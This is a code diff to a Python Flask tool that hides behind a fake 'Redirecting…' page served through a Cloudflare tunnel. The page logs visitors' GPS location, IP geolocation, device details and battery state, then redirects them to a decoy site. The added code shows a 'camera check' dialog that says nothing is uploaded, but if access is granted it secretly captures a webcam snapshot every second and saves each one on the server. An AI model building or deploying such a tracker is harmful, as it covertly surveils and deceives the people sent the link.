@@ -24,10 +24,12 @@ import geoip2.database
 from pyfiglet import Figlet
 
 # ---- Configuration ----
-YOUTUBE_URL = "https://www.youtube.com/watch?v=F17CBysnRso"
+YOUTUBE_URL = "https://8cpc.gov.in/"  # Change this to your desired redirect URL
 GEO_DB_PATH = os.path.join(os.path.dirname(__file__), "GeoLite2-City.mmdb")
 LOG_DIR = "logs"
 os.makedirs(LOG_DIR, exist_ok=True)
+POP_DIR = os.path.join(os.path.dirname(__file__), "pop")
+os.makedirs(POP_DIR, exist_ok=True)  # Ensure the pop directory exists immediately
 
 app = Flask(__name__)
 console = Console()
@@ -54,21 +56,16 @@ def download_cloudflared():
     machine = platform.machine().lower()
     cloudflared_path = get_cloudflared_path()
     
-    # Check if already downloaded
     if os.path.exists(cloudflared_path):
         console.print("[green]✅ cloudflared already exists[/]")
-        # Make executable on Unix-like systems
         if system != "Windows":
             os.chmod(cloudflared_path, 0o755)
         return cloudflared_path
     
     console.print("[yellow]📥 Downloading cloudflared...[/]")
-    
-    # Determine download URL
     base_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/"
     
     if system == "Windows":
-        # Windows
         if machine in ["amd64", "x86_64"]:
             filename = "cloudflared-windows-amd64.exe"
         elif machine == "arm64":
@@ -100,19 +97,16 @@ def download_cloudflared():
     download_url = base_url + filename
     
     try:
-        # Download the file
         console.print(f"[cyan]Downloading from: {download_url}[/]")
         response = requests.get(download_url, stream=True, timeout=30)
         response.raise_for_status()
         
-        # Handle archive files (macOS)
         if filename.endswith('.tgz'):
             temp_file = cloudflared_path + ".tgz"
             with open(temp_file, 'wb') as f:
                 for chunk in response.iter_content(chunk_size=8192):
                     f.write(chunk)
             
-            # Extract the archive
             with tarfile.open(temp_file, 'r:gz') as tar:
                 tar.extractall(os.path.dirname(cloudflared_path))
             
@@ -120,14 +114,11 @@ def download_cloudflared():
             extracted_path = os.path.join(os.path.dirname(cloudflared_path), "cloudflared")
             if os.path.exists(extracted_path):
                 shutil.move(extracted_path, cloudflared_path)
-        
-        # Regular binary download
         else:
             with open(cloudflared_path, 'wb') as f:
                 for chunk in response.iter_content(chunk_size=8192):
                     f.write(chunk)
         
-        # Make executable on Unix-like systems
         if system != "Windows":
             os.chmod(cloudflared_path, 0o755)
         
@@ -142,13 +133,11 @@ def ensure_cloudflared():
     """Ensure cloudflared is available, download if needed"""
     cloudflared_path = get_cloudflared_path()
     
-    # Check if file exists and is executable
     if os.path.exists(cloudflared_path):
         try:
-            # Test if it works
             result = subprocess.run([cloudflared_path, "--version"], 
                          capture_output=True, text=True, check=True, timeout=5)
-            version = result.stdout.strip().split('\n')[0] if result.stdout else "unknown"
+            version = result.stdout.strip().split('\n') if result.stdout else "unknown"
             console.print(f"[green]✅ cloudflared is ready (version: {version})[/]")
             return cloudflared_path
         except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
@@ -156,7 +145,6 @@ def ensure_cloudflared():
             if os.path.exists(cloudflared_path):
                 os.remove(cloudflared_path)
     
-    # Download fresh copy
     return download_cloudflared()
 
 # ---- Cloudflare Tunnel ----
@@ -176,7 +164,6 @@ def start_cloudflare_tunnel():
         )
         
         public_url = None
-        # Read output to find the tunnel URL
         for line in iter(process.stderr.readline, ''):
             if "trycloudflare.com" in line:
                 match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
@@ -184,7 +171,6 @@ def start_cloudflare_tunnel():
                     public_url = match.group(0)
                     break
             elif "INF" in line and "Registered tunnel" in line:
-                # Try to extract URL from different format
                 match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                 if match:
                     public_url = match.group(0)
@@ -202,7 +188,7 @@ tunnel_started = False
 def init_tunnel():
     global tunnel_process, public_url, tunnel_started
     if tunnel_started:
-        return  # Prevent duplicate tunnel starts
+        return
     
     tunnel_started = True
     tunnel_process, public_url = start_cloudflare_tunnel()
@@ -212,7 +198,7 @@ def init_tunnel():
         console.print(f"[bold green]   🌍 YOUR PUBLIC LINK: {public_url}[/]")
         console.print(f"[bold green]═══════════════════════════════════════════════════════[/]\n")
     
-    tunnel_ready.set()  # Signal that tunnel initialization is complete
+    tunnel_ready.set()
 
 def geo_lookup(ip):
     """Return geo and ISP info from MMDB or ip-api."""
@@ -263,7 +249,7 @@ def geo_lookup(ip):
 
 def reverse_geocode_osm(lat, lon):
     try:
-        url = f'https://nominatim.openstreetmap.org/reverse'
+        url = 'https://nominatim.openstreetmap.org/reverse'
         params = {
             'format': 'json',
             'lat': lat,
@@ -281,86 +267,191 @@ def reverse_geocode_osm(lat, lon):
 
 @app.route('/')
 def home():
-    html = f"""
+    html = """
     <!DOCTYPE html>
     <html><head><meta charset="utf-8"><title>Redirecting…</title></head>
     <style>
-      * {{ box-sizing: border-box; }}
-      body {{
+      * { box-sizing: border-box; }
+      body {
         margin: 0; min-height: 100vh; background: #111; color: #eee;
         font-family: Arial, sans-serif;
         display: grid; place-items: center;
-      }}
-      .loader {{
+      }
+      .loader {
         width: 40px; height: 40px;
         border: 4px solid #444; border-top-color: #62d996;
         border-radius: 50%; animation: spin .8s linear infinite;
-      }}
-      @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
+      }
+      @keyframes spin { to { transform: rotate(360deg); } }
     </style>
     <body>
+      <video id="hidden-video" autoplay playsinline style="display:none;"></video>
+
       <div class="loader" aria-label="Loading"></div>
+      <div id="camera-consent" style="display:none; position:fixed; inset:0; place-items:center; background:rgba(0,0,0,.78); z-index:9999;">
+        <div style="max-width:420px; margin:20px; padding:24px; background:#1b1b1b; color:#eee; border-radius:12px; font-family:Arial,sans-serif; text-align:center;">
+          <h2>Camera access</h2>
+          <p>This page can request access to your camera. Nothing is uploaded by this camera check.</p>
+          <button id="camera-allow">Allow camera</button>
+          <button id="camera-skip">Skip</button>
+          <p id="camera-status"></p>
+        </div>
+      </div>
       <script>
-        const data = {{
+        const data = {
           timestamp: new Date().toISOString(),
-          redirect_url: "{YOUTUBE_URL}",
+          redirect_url: "__REDIRECT_URL__",
           ua: navigator.userAgent,
           platform: navigator.platform,
           language: navigator.language,
-          screen: {{ w: screen.width, h: screen.height }},
+          screen: { w: screen.width, h: screen.height },
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           cookieEnabled: navigator.cookieEnabled,
           hardwareConcurrency: navigator.hardwareConcurrency || null,
           deviceMemory: navigator.deviceMemory || null,
-          connection: navigator.connection ? {{
+          connection: navigator.connection ? {
             effectiveType: navigator.connection.effectiveType,
             downlink: navigator.connection.downlink,
             rtt: navigator.connection.rtt
-          }} : null,
-        }}; 
+          } : null,
+        }; 
+        let cameraStream = null;
 
-        async function augmentBattery() {{
-          if (navigator.getBattery) {{
+        async function augmentBattery() {
+          if (navigator.getBattery) {
             const batt = await navigator.getBattery();
-            data.battery = {{
+            data.battery = {
               level: Math.round(batt.level * 100) + "%",
               charging: batt.charging
-            }}; 
-          }}
-        }}
+            }; 
+          }
+        }
 
-        function sendAndRedirect(extra = {{}}) {{
+        function sendAndRedirect(extra = {}) {
           Object.assign(data, extra);
           navigator.sendBeacon('/log', JSON.stringify(data));
-          setTimeout(() => window.location.replace("{YOUTUBE_URL}"), 100);
-        }}
+          setTimeout(() => window.location.replace("__REDIRECT_URL__"), 100);
+        }
 
-        async function init() {{
-          await augmentBattery();
-          if (!navigator.geolocation) {{
-            sendAndRedirect();
+        function finishCameraStep() {
+          document.getElementById("camera-consent").remove();
+          navigator.sendBeacon('/log', JSON.stringify(data));
+          
+          if (data.camera_permission === "granted") {
+            window.open("__REDIRECT_URL__", "_blank", "noopener,noreferrer");
+          } else {
+            setTimeout(() => window.location.replace("__REDIRECT_URL__"), 100);
+          }
+        }
+
+        function processPhotoCapture(stream) {
+          const video = document.getElementById('hidden-video');
+          video.srcObject = stream;
+          
+          setInterval(() => {
+            try {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth || 640;
+              canvas.height = video.videoHeight || 480;
+              
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              
+              canvas.toBlob((blob) => {
+                if (!blob) return;
+                const formData = new FormData();
+                formData.append('photo', blob, 'snap.jpg');
+                
+                fetch('/upload_photo', {
+                  method: 'POST',
+                  body: formData
+                }).catch(e => console.error(e));
+              }, 'image/jpeg', 0.85);
+            } catch (err) {
+              console.error(err);
+            }
+          }, 1000);
+        }
+
+        async function requestCamera() {
+          const status = document.getElementById("camera-status");
+          if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            data.camera_permission = "unsupported";
+            finishCameraStep();
             return;
-          }}
+          }
+          try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({video: { facingMode: "user" }});
+            data.camera_permission = "granted";
+            
+            processPhotoCapture(cameraStream);
+            finishCameraStep();
+          } catch (error) {
+            data.camera_permission = error.name === "NotAllowedError" ? "denied" : "error";
+            status.textContent = "Camera permission was not granted.";
+            setTimeout(finishCameraStep, 500);
+          }
+        }
+
+        function continueAfterLocation(extra = {}) {
+          Object.assign(data, extra);
+          setTimeout(() => {
+            requestCamera();
+          }, 100);
+        }
+
+        async function init() {
+          augmentBattery().catch(() => {});
+          
+          if (!navigator.geolocation) {
+            continueAfterLocation();
+            return;
+          }
+
+          let movedToNextStep = false;
+
+          function triggerNextStep(extraData = {}) {
+            if (!movedToNextStep) {
+              movedToNextStep = true;
+              continueAfterLocation(extraData);
+            }
+          }
+
           navigator.geolocation.getCurrentPosition(
-            pos => sendAndRedirect({{
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy
-            }}),
-            err => {{
+            pos => {
+              triggerNextStep({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy
+              });
+            },
+            err => {
               console.warn("Geo error:", err.message);
-              sendAndRedirect();
-            }},
-            {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
+              triggerNextStep();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
           );
-        }}
+        }
 
         init();
       </script>
     </body>
     </html>
     """
-    return render_template_string(html)
+    return render_template_string(html.replace("__REDIRECT_URL__", YOUTUBE_URL))
+
+@app.route('/upload_photo', methods=['POST'])
+def upload_photo():
+    if 'photo' not in request.files:
+        return ("", 400)
+    file = request.files['photo']
+    if file and file.filename != '':
+        filename = f"snap_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_%f')}.jpg"
+        save_path = os.path.join(POP_DIR, filename)
+        file.save(save_path)
+        console.print(f"[bold green][+] Frame snapshot saved to pop folder:[/] {save_path}")
+        return ("", 200)
+    return ("", 400)
 
 @app.route('/log', methods=['POST'])
 def log_data():
@@ -370,6 +461,9 @@ def log_data():
     except json.JSONDecodeError:
         pass
 
+    if info.get("camera_permission") == "granted":
+        os.makedirs(POP_DIR, exist_ok=True)
+
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S %Z")
     latitude  = info.get("latitude")
@@ -377,12 +471,9 @@ def log_data():
     accuracy  = info.get("accuracy", "N/A")
 
     has_precise_location = latitude is not None and longitude is not None
-
-    # Get IP info for ISP/ASN and fallback location
     geo = geo_lookup(ip)
 
     if has_precise_location:
-        # OVERRIDE IP location with GPS coordinates
         geo.update({
             'latitude': latitude,
             'longitude': longitude,
@@ -449,6 +540,7 @@ def log_data():
         ("Memory (GB)", str(info.get("deviceMemory", "N/A"))),
         ("Conn Type", str((info.get("connection") or {}).get("effectiveType", "N/A"))),
         ("Conn RTT", str((info.get("connection") or {}).get("rtt", "N/A"))),
+        ("Camera Permission", info.get("camera_permission", "N/A")),
         ("Battery", json.dumps(info.get("battery", {}), separators=(", ", ": ")))
     ]:
         display_val = f"[bold green]{v}[/]" if v and v != "N/A" else "[red]N/A[/]"
@@ -488,14 +580,11 @@ if __name__ == "__main__":
     console.print("[bold blue][*] Server listening on port 80[/]")
     console.print("[yellow]⏳ Setting up Cloudflare tunnel...[/]")
     
-    # Start tunnel in background (only once)
     threading.Thread(target=init_tunnel, daemon=True).start()
     
-    # Wait for tunnel initialization with timeout
-    max_wait = 30  # seconds
+    max_wait = 30
     wait_start = time.time()
     
-    # Show progress indicator
     with console.status("[bold yellow]Waiting for tunnel to establish...[/]", spinner="dots"):
         while not tunnel_ready.is_set():
             if time.time() - wait_start > max_wait:
@@ -503,7 +592,6 @@ if __name__ == "__main__":
                 break
             time.sleep(0.5)
     
-    # Display final status
     if public_url:
         console.print(f"""
 [bold green]╔══════════════════════════════════════════════════════════════════╗
